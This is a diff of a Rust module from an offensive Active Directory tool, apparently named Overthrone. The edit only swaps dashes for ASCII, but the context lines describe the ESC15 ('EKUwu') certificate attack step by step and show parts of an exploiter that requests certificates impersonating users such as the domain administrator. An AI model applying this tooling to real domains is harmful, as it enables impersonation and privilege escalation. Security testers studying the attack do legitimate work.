@@ -1,4 +1,4 @@
-//! ESC15 — Schema V1 Template with Enrollee-Supplied Subject (EKUwu)
+//! ESC15 -- Schema V1 Template with Enrollee-Supplied Subject (EKUwu)
 //!
 //! ESC15 targets **Schema Version 1** certificate templates.  Unlike V2+ templates
 //! where `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` is explicitly set, V1 templates
@@ -8,7 +8,7 @@
 //! On **unpatched** Certificate Authorities (pre-KB5014754), the CA does not
 //! enforce the `szOID_NTDS_CA_SECURITY_EXT` (1.3.6.1.4.1.311.25.2) extension
 //! that embeds the requester's SID.  This means the SAN in the issued cert is
-//! trusted at face value during Kerberos PKINIT — allowing impersonation.
+//! trusted at face value during Kerberos PKINIT -- allowing impersonation.
 //!
 //! **Vulnerable configuration:**
 //! - Schema Version 1 template (often legacy templates like `User`, `Machine`,
@@ -23,9 +23,9 @@
 //!    (e.g. `administrator@corp.local`).
 //! 3. The CA issues the cert with the attacker-supplied SAN (no security
 //!    extension enforcement).
-//! 4. Authenticate via PKINIT → TGT for the impersonated principal.
+//! 4. Authenticate via PKINIT -> TGT for the impersonated principal.
 //!
-//! Reference: "EKUwu" — Justin Bollinger (@TechBolts), SpecterOps (2024)
+//! Reference: "EKUwu" -- Justin Bollinger (@TechBolts), SpecterOps (2024)
 
 use crate::adcs::pfx::create_pfx;
 use crate::adcs::web_enrollment::WebEnrollmentClient;
@@ -33,9 +33,9 @@ use crate::adcs::{IssuedCertificate, create_client_auth_csr};
 use crate::error::{OverthroneError, Result};
 use tracing::info;
 
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 //  Constants
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 
 /// Schema Version 1 flag value (msPKI-Template-Schema-Version)
 pub const SCHEMA_VERSION_1: u32 = 1;
@@ -43,9 +43,9 @@ pub const SCHEMA_VERSION_1: u32 = 1;
 /// The security extension OID added by KB5014754 patching
 pub const NTDS_CA_SECURITY_EXT_OID: &str = "1.3.6.1.4.1.311.25.2";
 
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 //  Types
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 
 /// A Schema V1 template vulnerable to ESC15
 #[derive(Debug, Clone)]
@@ -90,9 +90,9 @@ pub struct Esc15Result {
     pub impact_description: String,
 }
 
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 //  Detection helpers
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 
 /// Check whether a given template is a Schema V1 template vulnerable to ESC15.
 /// Returns `true` when:
@@ -133,11 +133,11 @@ pub fn cert_has_security_extension(cert_der: &[u8]) -> bool {
     }
 }
 
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 //  Exploiter
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 
-/// ESC15 exploiter — Schema V1 template SAN abuse
+/// ESC15 exploiter -- Schema V1 template SAN abuse
 pub struct Esc15Exploiter {
     web_client: WebEnrollmentClient,
 }
@@ -154,7 +154,7 @@ impl Esc15Exploiter {
         Ok(Self { web_client })
     }
 
-    /// Execute the ESC15 attack — request a cert from a Schema V1 template
+    /// Execute the ESC15 attack -- request a cert from a Schema V1 template
     /// with a SAN containing the target's UPN.
     pub async fn exploit(&self, config: &Esc15Config) -> Result<Esc15Result> {
         let target_upn = if config.target_user.contains('@') {
@@ -196,7 +196,7 @@ impl Esc15Exploiter {
         if cert_has_security_extension(&cert_data) {
             tracing::warn!(
                 "ESC15: The issued certificate contains the szOID_NTDS_CA_SECURITY_EXT \
-                 extension — the CA appears to be patched (KB5014754). PKINIT impersonation \
+                 extension -- the CA appears to be patched (KB5014754). PKINIT impersonation \
                  may fail if the enforcement registry key is active."
             );
         }
